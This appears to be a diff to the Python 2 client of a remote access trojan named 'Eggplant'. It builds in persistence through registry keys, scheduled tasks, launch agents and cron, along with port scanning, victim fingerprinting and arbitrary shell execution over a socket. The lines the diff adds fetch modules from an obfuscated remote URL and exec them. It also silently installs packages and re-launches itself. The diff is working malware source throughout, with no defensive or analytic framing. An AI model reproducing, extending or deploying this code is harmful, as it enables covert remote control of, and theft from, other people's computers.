@@ -43,6 +43,7 @@ class Eggplant(object):
         self.backdoors      = dict(kwargs.get('backdoors')) if kwargs.get('backdoors') else dict({})
         self.local_network  = dict(kwargs.get('local_network')) if kwargs.get('local_network') else dict({})
         self.crontab        = dict({'Crontab':'/etc/cron.d', 'User Crontab':'/var/spool/cron'}) if (sys.platform.startswith('linux') or sys.platform.endswith('nix')) else None
+        self.tmpdir         = bytes(os.path.expandvars("%TEMP%")) if os.name is 'nt' else bytes(os.path.expandvars("$TMPDIR"))
         self.fname          = bytes(sys.argv[0][:sys.argv[0].rfind('.')])
         self.ip             = bytes(get('http://api.ipify.org').text.encode())
         self.localhost      = bytes(socket.gethostbyname(socket.gethostname()))
@@ -61,6 +62,7 @@ class Eggplant(object):
         self.identity       = lambda:"\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Sessions',self.sessions()), ('Platform',self.platform), ('IP',self.ip), ('Machine',self.machine), ('Login',self.login), ('Admin',self.admin), ('Files',self.files)] if i[1]])
         self.register       = lambda:dict({'uid':self.mac, 'sessions':self.sessions(), 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'registry_keys':self.persistence.get('registry keys'), 'scheduled_tasks':self.persistence.get('scheduled tasks')}) if os.name is 'nt' else lambda:dict({'uid':self.mac, 'sessions':self.sessions(), 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'launch_agents':self.persistence.get('launch agents')})
         self.port_scan      = lambda host:filter(self.scan, [(host,port) for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389]])
+        self.get_modules    = lambda:[new_module(b64decode(get(i['git_url']).json()['content']), i['name']) for i in get(self._deobfuscate('YjY2ODk3OTQ1ODQ3MTQ4OGQ3ODAyMjU3NDhjNzEzYzMwNTc0NWFjMmIyZWY1NjMyYWUxZGVmNmI0ZDA2NDEwZTcxOTdkNTAwOTYyNmViODk2MTgyZDMzOWFlMjE1NDhhZTYzYTU3YjZhZGU5YzcyNzE0NjE0YTU2ODUyYmRlYjYwMDk4NGI5N2Q3MTVkZDNlNWI5N2I2OTI1YjViYjIwODVhYWUxZTA2ODAxZTczYWI3MjQ2NmZiOTE5Mjk4ODk2NWQ0NWUyMGYyYjBhMjhlNmQxYzcxYThjNDU5OTNkMTJiMjk2MjU1ZTU3ZWNlNjgwZDZlNzFkMjUyZWFmMTdiODY3Nzc3ZTYzNjEwMzEyNmZiNzJiYjY2MDYzNDZiYzcyOTIzM2FmZTljN2NkOTEyNDg1MjYwYzNjNzY0YWQ1YjcyMDIxNmVhYzk4OTY1Y2Q1N2UwZWE2ODQwYWQ3YTQxZDA2YjliODUxM2Q1OGViOTY2YzFiNmNhOTVlMjI4NzVmNDQzMDE0NzA1NTg0NTE4NWU2YWI4YzYxYWU4ODQ3YTFjM2U2NTc1MTUxMWJiYjQ3MjJiYWQ2NDdlZDA5NWIwYjM0YTNlYzlhMDUxZTA2ZTc4M2Q2MzMyODIzMzJlMjk3YTYwNTA0NDcyMjkwMzljODgzOTY0NTdjMjU1OTc2NGJlNDAwMThkNDAxNzZkMTIyNDMxZGM4MmJjMjM5ZGViM2QxMzdlYmFjOWU4MDE0ZDcyOWMyMTg2YmFmNDY2MjEyMjNlNzQ3NzdjOWI2YTI0MGRmYWViMTI2YWViMjQzMTdhMWJjZDQwM2I2ODViODNhMDgyM2M1ZTYyN2QwNmQ1YjhlODc3YWE0NDFhOTk3OWVhMGIzZA==')).json()]
         self.commands       = { 'cat'           :   self.cat,
                                 'ls'            :   self.ls,
                                 'pwd'           :   self.pwd,
@@ -85,7 +87,6 @@ class Eggplant(object):
                                 'register'      :   self.register_client,
                                 'persistence'   :   self.client_persistence
                                 }
-
 
     def _services(self):
         """Initialize a dictionary of port numbers and their associated protocols/services as the key/value pairs"""
@@ -915,12 +916,13 @@ class Eggplant(object):
             cmd, _, action = data.partition(' ')
             if cmd in self.commands:
                 output = self.commands[cmd](action) if action else self.commands[cmd]()
+            elif cmd in sys.modules:
+                output = sys.modules[cmd].run()
             else:
                 p = subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
                 output = str().join((p.communicate()))
-            if not output.__doc__.startswith('str'):
-                break
-            self._send(output, method=cmd)
+
+            self._send(bytes(output), method=cmd)
         if not connection:
             try:
                 self.standby(self.socket.getpeername()[0])
@@ -928,41 +930,39 @@ class Eggplant(object):
                 print 'Standby error: %s' % str(by)
                 sys.exit(0)
 
-def missing_dependencies():
-    dependencies = dict({'AES':'pycrypto','HMAC':'pycrypto','SHA256':'pycrypto','ShellExecuteEx':'win32com','b64decode':'base64','b64encode':'base64','bytes_to_long':'pycrypto','get':'requests','hexlify':'binascii','long_to_bytes':'pycrypto','sleep':'time','unhexlify':'binascii','uuid1':'uuid'})
+def check_dependencies():
+    dependencies = dict({'AES':'pycrypto','HMAC':'pycrypto','SHA256':'pycrypto','b64decode':'base64','b64encode':'base64','bytes_to_long':'pycrypto','get':'requests','hexlify':'binascii','long_to_bytes':'pycrypto','sleep':'time','unhexlify':'binascii','uuid1':'uuid'})
     packages     = set([package for package in globals() if package in dependencies])
     missing      = set([dependencies.get(i) for i in list(set(dependencies.keys()).symmetric_difference(packages)) if dependencies.get(i)])
-    return missing
-
-def install(packages):
-    """Install missing packages"""
-    try:
-        pip.InstallCommand().main(packages)
-    except: pass
-    execfile(sys.argv[0])
-    sys.exit(0)
-
+    if len(missing):
+        for pkg in missing:
+            try:
+                pip.InstallCommand().main([pkg])
+            except: pass
+        execfile(sys.argv[0])
+        sys.exit(0)
+    else:
+        return True
+    
 def resource_path(relative_path):
-    """Helper function for compiling executables with external platform-dependent resources"""
     return os.path.join(getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))), relative_path)
 
-def create_module(module_code, module_name):
-    """Create new module from a string, text file, code from a URL, or code from a compiled-binary"""
-    module = new_module(module_name)
-    exec module_code in module.__dict__
+def create_module(code, name):
+    module = new_module(name)
+    exec code in module.__dict__
+    sys.modules[name] = module
     return module
 
 def main():
-    dependencies = missing_dependencies()
-    if len(dependencies):
-        install(dependencies)
-    while True:
-        try:
-            e = Eggplant(debug=True)
-            e.run(e.socket)
-        except Exception as x:
-            print str(x)
-            sys.exit(0)
+    configured = check_dependencies()
+    if configured:
+        while True:
+            try:
+                e = Eggplant()
+                e.run(e.socket)
+            except Exception as x:
+                print str(x)
+                sys.exit(0)
 
 
 if __name__ == '__main__':
